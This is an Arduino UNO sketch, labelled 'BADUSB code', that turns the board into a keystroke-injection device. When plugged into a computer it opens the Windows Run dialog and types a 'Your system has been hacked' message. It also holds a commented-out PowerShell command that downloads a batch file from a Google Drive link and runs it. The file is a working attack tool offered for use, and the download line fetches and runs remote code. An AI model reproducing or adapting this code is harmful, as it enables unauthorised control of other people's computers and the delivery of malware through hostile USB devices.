/* BADUSB code by sPkSoft For arduino UNO */

//Modifier Keys
#define LEFT_CTRL   0x01
#define LEFT_SHIFT  0x02
#define LEFT_ALT    0x04
#define LEFT_GUI    0x08
#define RIGHT_CTRL  0x10
#define RIGHT_SHIFT 0x20
#define RIGHT_ALT   0x40
#define RIGHT_GUI   0x80

//Keys
#define KEY_ENTER 0x28
#define KEY_BACKSPEACE 0x2A
#define KEY_TAB 0x2B
#define KEY_CAPSLOCK 0x39
//keyPress(RIGHT_ALT, 0x1F);

uint8_t buf[8] = { 0 }; //buffer

void setup() 
{
  Serial.begin(9600);
  delay(10000);
  keyPress(LEFT_GUI, 0x15); // Windows keys + R
  keyRelease();
  delay(200);
  /*keyString("cmd.exe");
  delay(500);          
  //keyPress(0, KEY_ENTER);
  //keyRelease();
  delay(500);*/
  keyString("msg * Your system has been hacked by F41K3N!!!");
  //keyString("powershell -Command \"(New-Object Net.WebClient).DownloadFile('https://drive.google.com/file/d/0BzuivCzvM49dVEFfZENaY2V4amM/view?usp=sharing', 'hi.bat')\" & hi.bat & exit");
  keyPress(0, KEY_ENTER);
  keyRelease();
}

void loop() 
{
  //keyString("abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ 1234567890 - = [] \\ ; ' , . / !@#$%^&*()_+ {}|; \" <> ?"); // <---test key
}
 
void keyRelease() 
{
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8);	// Release key  
}

void keyString(String text) {
  char alpha[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
  int mean_dic[] = {4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29};
  //                                                                                    39    61    91    93    44    46    45    32    43
  char normal_sym[] =     { '1',  '2',  '3',  '4',  '5',  '6',  '7',  '8',  '9',  '0',  '\'',  '¡',  '[',  '+', 'ñ',  ',',  '.',  '-',  ' ',  '+'};
  int mean_normal_sym[] = {0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,  0x2D, 0x2E, 0x2F, 0x30, 0x33 ,0x36, 0x37, 0x38, 0x2C, 0x57};
  
  char shift_sym[] =     { '!',  '"',  '#',  '$',  '%',  '&',  '/',  '(',  ')',  '=',  '?',  '¿',  '°',  '*',  'Ñ', '{',   ';',  ':',  '_'};
  int mean_shift_sym[] = {0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E, 0x2F, 0x30, 0x33, 0x34, 0x36, 0x37, 0x38};
  
/*  English Dic
  char alpha[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
  int mean_dic[] = {4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29};

  char normal_sym[] =     {  '1', '2',  '3',  '4', ' 5',  '6',  '7',  '8',  '9',  '0',  '-',  '=',  '[',  ']',  '\\', ';'  '\'',  ',',  '.',  '/',  ' '};
  int mean_normal_sym[] = {0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x33, 0x34, 0x36, 0x37, 0x38, 0x2C};

  char shift_sym[] = {'!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '{', '}', '|', ':', '\"', '<', '>', '?'};
  int mean_shift_sym[] = {0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x33, 0x34, 0x36, 0x37, 0x38};
*/
  char temp_char;

  for(int i = 0;i<text.length();i++)  //Recorre lo que vos le mandaste
  {
    temp_char = text.charAt(i); //Agarra el primer caracter que se le envia por parametro
    if(((int)temp_char >= 97 && (int)temp_char <= 122) || ((int)temp_char >= 65 && (int)temp_char <= 90)) //Si el caratecer es una letra mayuscula o minuscula ---
    {
      for(int j = 0;j<sizeof(mean_dic) - 1;j++) //Recorre esta lista
      {
        if(temp_char == alpha[j]) //Si el caracter es igual al de la lista entonces...
        {
          keyPress(0, mean_dic[j]); //Presionalo
          keyRelease();
          break;
        } 
        else if(temp_char == toupper(alpha[j])) //Si el caracter es igual al de la lista (En MaYuscula)
        {
          keyPress(RIGHT_SHIFT, mean_dic[j]); //Presionalo
          keyRelease();
          break;
        }
      }
    }
    
    else if(((int)temp_char >= 48 && (int)temp_char <= 57) || ((int)temp_char >= 43 && (int)temp_char <= 46 || (int)temp_char == 32  || (int)temp_char == 39 || (int)temp_char == 173 || (int)temp_char == 164 || (int)temp_char == 91 || (int)temp_char == 93)) //Si el caratecer es un caracter especial o un numero...
    {
      for(int j = 0;j<sizeof(mean_normal_sym)-1;j++)  //Recorro los nros
      {
        if(temp_char == normal_sym[j]) //Si en una de esas coincide
        {
          keyPress(0, mean_normal_sym[j]);
          keyRelease();
          break;
        }

      }
    }
    
    else
    {
        for(int i = 0;i<sizeof(mean_shift_sym)-1;i++)//Di lo tuyo Bart...
        {
          if(temp_char == shift_sym[i]) 
          {
            keyPress(LEFT_SHIFT, mean_shift_sym[i]);
            keyRelease();
            break;
          }
        }
      }
  }
}

void keyPress(int mod, int key) 
{
  buf[0] = mod;
  buf[2] = key;
  Serial.write(buf, 8);
}
